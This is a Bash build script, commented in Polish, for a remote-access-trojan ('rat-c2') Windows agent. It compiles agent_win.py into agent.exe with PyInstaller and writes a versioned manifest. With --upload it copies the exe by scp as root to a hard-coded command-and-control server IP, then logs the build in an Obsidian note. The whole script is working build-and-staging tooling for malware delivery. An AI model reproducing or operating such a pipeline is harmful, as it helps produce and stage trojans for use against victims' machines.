#!/usr/bin/env bash
# build_agent.sh — wersjonowany builder agenta (agent_win.py -> agent.exe).
#
# Rozwiazuje problem z Daily 2026-08-16: "agent.exe nieaktualny — zbudowany
# 15.08 03:21, zrodlo zmienione 04:04 -> exe konczyl sie natychmiast (exit 0)".
#
# Pipeline: freshness check -> PyInstaller build -> SHA256 -> manifest ->
#           upload do C2 -> timestamp w Obsidianie.
#
# Uzycie:
#   build_agent.sh --check                  # tylko sprawdz czy exe jest swiezy (exit 1 jesli nie)
#   build_agent.sh                          # pelny pipeline (bez uploadu)
#   build_agent.sh --upload                 # pelny pipeline + upload do C2 (scp)
#   build_agent.sh --force                  # buduj nawet gdy exe jest swiezy
#   build_agent.sh --dry-run                # pokaz co by sie stalo, nic nie wykonuj
#
# Zmienne env (nadpisuja defaulty):
#   AGENT_SRC   sciezka do zrodla agenta            (default: /root/rat-c2/agent_win.py)
#   WORK_DIR    katalog roboczy (dist/manifests)    (default: /root/rat-c2)
#   OBSIDIAN_VAULT sciezka do vaultu Obsidian       (default: auto-detect)
#   C2_HOST     host C2 do uploadu                  (default: 5.175.189.133)
#   C2_USER     uzytkownik C2                       (default: root)
#   C2_DIR      katalog docelowy na C2              (default: /root/rat-c2/dist/)
set -u

# ---- konfiguracja -----------------------------------------------------------
AGENT_SRC="${AGENT_SRC:-/root/rat-c2/agent_win.py}"
WORK_DIR="${WORK_DIR:-/root/rat-c2}"
DIST_DIR="$WORK_DIR/dist"
MANIFEST_DIR="$WORK_DIR/manifests"
VERSION_FILE="$WORK_DIR/VERSION"

# vault: najpierw ten checkout, potem klasyczna sciezka labu .133
if [[ -n "${OBSIDIAN_VAULT:-}" ]]; then
  VAULT="$OBSIDIAN_VAULT"
elif [[ -d "/root/Obsidian" ]]; then
  VAULT="/root/Obsidian"
else
  VAULT="/root/obsidian-vault"
fi

C2_HOST="${C2_HOST:-5.175.189.133}"
C2_USER="${C2_USER:-root}"
C2_DIR="${C2_DIR:-/root/rat-c2/dist/}"

PYINSTALLER="${PYINSTALLER:-pyinstaller}"
EXE_NAME="${EXE_NAME:-agent}"

FORCE=0; DRY=0; DO_UPLOAD=0; CHECK_ONLY=0
for a in "$@"; do
  case "$a" in
    --force)  FORCE=1 ;;
    --dry-run) DRY=1 ;;
    --upload) DO_UPLOAD=1 ;;
    --check)  CHECK_ONLY=1 ;;
    --help|-h)
      sed -n '2,24p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "nieznany argument: $a" >&2; exit 2 ;;
  esac
done

log()  { echo "[*] $*"; }
die()  { echo "[!] $*" >&2; exit 1; }
now()  { date -u +%Y-%m-%dT%H:%M:%SZ; }
stamp(){ date -u +%Y%m%dT%H%M%SZ; }

# ---- pre-flight -------------------------------------------------------------
[[ -f "$AGENT_SRC" ]] || die "brak zrodla agenta: $AGENT_SRC"
SRC_SHA="$(sha256sum "$AGENT_SRC" | awk '{print $1}')"
SRC_MTIME="$(stat -c %y "$AGENT_SRC" 2>/dev/null | cut -d. -f1)"
EXE_PATH="$DIST_DIR/${EXE_NAME}.exe"

[[ "$CHECK_ONLY" -eq 1 ]] && {
  if [[ ! -f "$EXE_PATH" ]]; then
    echo "STALE: brak exe ($EXE_PATH)"
    exit 1
  fi
  if [[ "$AGENT_SRC" -nt "$EXE_PATH" ]]; then
    echo "STALE: zrodlo nowsze niz exe (src $SRC_MTIME)"
    exit 1
  fi
  echo "OK: exe swiezy (src $SRC_MTIME)"
  exit 0
}

if [[ "$FORCE" -eq 0 && -f "$EXE_PATH" && ! "$AGENT_SRC" -nt "$EXE_PATH" ]]; then
  log "exe swiezy, pomijam build (uzyj --force zeby przebudowac)"
  NEED_BUILD=0
else
  NEED_BUILD=1
fi

# ---- wersja ----------------------------------------------------------------
if [[ -f "$VERSION_FILE" ]]; then
  PREV="$(cat "$VERSION_FILE")"
else
  PREV="0.0"
fi
VER="$(date -u +%Y%m%d).$((${PREV##*.} + 1))"
BUILD_ID="$(stamp)"
log "wersja: $VER (build_id $BUILD_ID, poprzednia $PREV)"

# ---- build -----------------------------------------------------------------
if [[ "$DRY" -eq 1 ]]; then
  log "dry-run: pominieto build"
  BUILD_OK=0
else
  if [[ "$NEED_BUILD" -eq 1 ]]; then
    command -v "$PYINSTALLER" >/dev/null || die "brak pyinstaller ($PYINSTALLER)"
    mkdir -p "$DIST_DIR" "$MANIFEST_DIR"
    # wersjonowanie w exe: modul _build_info.py obok zrodla (agent moze import _build_info)
    BIO="$WORK_DIR/_build_info.py"
    cat > "$BIO" <<EOF
# auto-generowany przez build_agent.sh — nie edytowac
BUILD_ID = "$BUILD_ID"
VERSION  = "$VER"
SRC_SHA256 = "$SRC_SHA"
EOF
    log "buduje: $PYINSTALLER --onefile --clean --name $EXE_NAME $AGENT_SRC (z _build_info.py)"
    if ! "$PYINSTALLER" --onefile --clean --name "$EXE_NAME" --distpath "$DIST_DIR" \
        --workpath "$WORK_DIR/.pybuild" --specpath "$WORK_DIR/.pybuild" "$AGENT_SRC" \
        --hidden-import _build_info 2>&1 | tail -5; then
      die "build nieudany"
    fi
    BUILD_OK=1
  else
    log "exe juz istnial, bez przebudowy"
    BUILD_OK=1
  fi
fi

if [[ -f "$EXE_PATH" ]]; then
  EXE_SHA="$(sha256sum "$EXE_PATH" | awk '{print $1}')"
  EXE_SIZE="$(stat -c %s "$EXE_PATH")"
elif [[ "$DRY" -eq 1 ]]; then
  EXE_SHA="0000000000000000000000000000000000000000000000000000000000000000"
  EXE_SIZE=0
else
  die "brak artefaktu po buildzie: $EXE_PATH"
fi
log "artefakt: $EXE_PATH ($EXE_SIZE B) sha256 $EXE_SHA"

# ---- manifest --------------------------------------------------------------
mkdir -p "$MANIFEST_DIR"
MANIFEST="$MANIFEST_DIR/MANIFEST-$BUILD_ID.json"
PYVER="$( (command -v "$PYINSTALLER" >/dev/null && "$PYINSTALLER" --version 2>/dev/null) || echo "n/a")"
python3 - "$MANIFEST" <<EOF
import json, sys, datetime
m = {
  "build_id": "$BUILD_ID",
  "version": "$VER",
  "built_at": "$(now)",
  "src":     {"path": "$AGENT_SRC", "sha256": "$SRC_SHA", "mtime": "$SRC_MTIME"},
  "artifact":{"path": "$EXE_PATH", "name": "$EXE_NAME.exe", "sha256": "$EXE_SHA", "size": $EXE_SIZE},
  "toolchain":{"pyinstaller": "$PYVER", "host": "$(hostname)"},
  "upload":  {"target": "$C2_USER@$C2_HOST:$C2_DIR", "status": "pending"},
  "obsidian":{"note": "", "appended": False},
}
open(sys.argv[1], "w").write(json.dumps(m, indent=2) + "\n")
EOF
cp "$MANIFEST" "$MANIFEST_DIR/MANIFEST-latest.json"
log "manifest: $MANIFEST"

# ---- upload do C2 ----------------------------------------------------------
UPLOAD_STATUS="skipped"
if [[ "$DO_UPLOAD" -eq 1 && "$DRY" -eq 0 ]]; then
  log "upload: $EXE_PATH -> $C2_USER@$C2_HOST:$C2_DIR"
  if ssh -o BatchMode=yes -o ConnectTimeout=10 "$C2_USER@$C2_HOST" "mkdir -p $C2_DIR" \
      && scp -q "$EXE_PATH" "$MANIFEST" "$C2_USER@$C2_HOST:$C2_DIR"; then
    UPLOAD_STATUS="ok"
    log "upload OK"
  else
    UPLOAD_STATUS="fail"
    echo "[!] upload nieudany (BatchMode — sprawdz klucz ssh)" >&2
  fi
elif [[ "$DO_UPLOAD" -eq 1 ]]; then
  UPLOAD_STATUS="dry-run"
  log "dry-run: scp -q $EXE_PATH $C2_USER@$C2_HOST:$C2_DIR"
fi

# ---- timestamp w Obsidianie -------------------------------------------------
DAY="$(date -u +%Y-%m-%d)"
DAILY="$VAULT/Daily/$DAY.md"
BODY="Build agenta **v$VER** (build_id \`$BUILD_ID\`) — $EXE_PATH

- zrodlo: \`$AGENT_SRC\` sha256 \`${SRC_SHA:0:16}…\` (mtime $SRC_MTIME)
- artefakt: \`$EXE_NAME.exe\` **${EXE_SIZE} B** · sha256 \`$EXE_SHA\`
- pyinstaller: $PYVER · host: $(hostname)
- upload C2: $UPLOAD_STATUS · manifest: \`$MANIFEST\`"

if [[ "$DRY" -eq 0 ]]; then
  mkdir -p "$VAULT/Daily"
  if [[ ! -f "$DAILY" ]]; then
    printf -- '---\ndate: %s\ntags: [daily]\n---\n\n# %s\n' "$DAY" "$DAY" > "$DAILY"
  fi
  {
    echo
    echo "## Build agenta v$VER ($(now))"
    echo
    printf '%s\n' "$BODY"
    echo
  } >> "$DAILY"
  log "obsidian += $DAILY"
  UPLOAD_STATUS_ENV="$UPLOAD_STATUS" python3 - "$MANIFEST" "$DAY" <<'EOF'
import json, os, sys
m = json.load(open(sys.argv[1]))
m["upload"]["status"] = os.environ["UPLOAD_STATUS_ENV"]
m["obsidian"] = {"note": "Daily/%s.md" % sys.argv[2], "appended": True}
json.dump(m, open(sys.argv[1], "w"), indent=2)
open(sys.argv[1], "a").write("\n")
EOF
else
  log "dry-run: dopisalbym do $DAILY:"
  printf '%s\n' "$BODY" | sed 's/^/    /'
fi

echo
echo "=== PODSUMOWANIE ==="
echo "  wersja    : $VER"
echo "  build_id  : $BUILD_ID"
echo "  exe       : $EXE_PATH ($EXE_SIZE B)"
echo "  sha256    : $EXE_SHA"
echo "  manifest  : $MANIFEST"
echo "  upload C2 : $UPLOAD_STATUS"
echo "  obsidian  : $DAILY"
echo "=== OK ==="
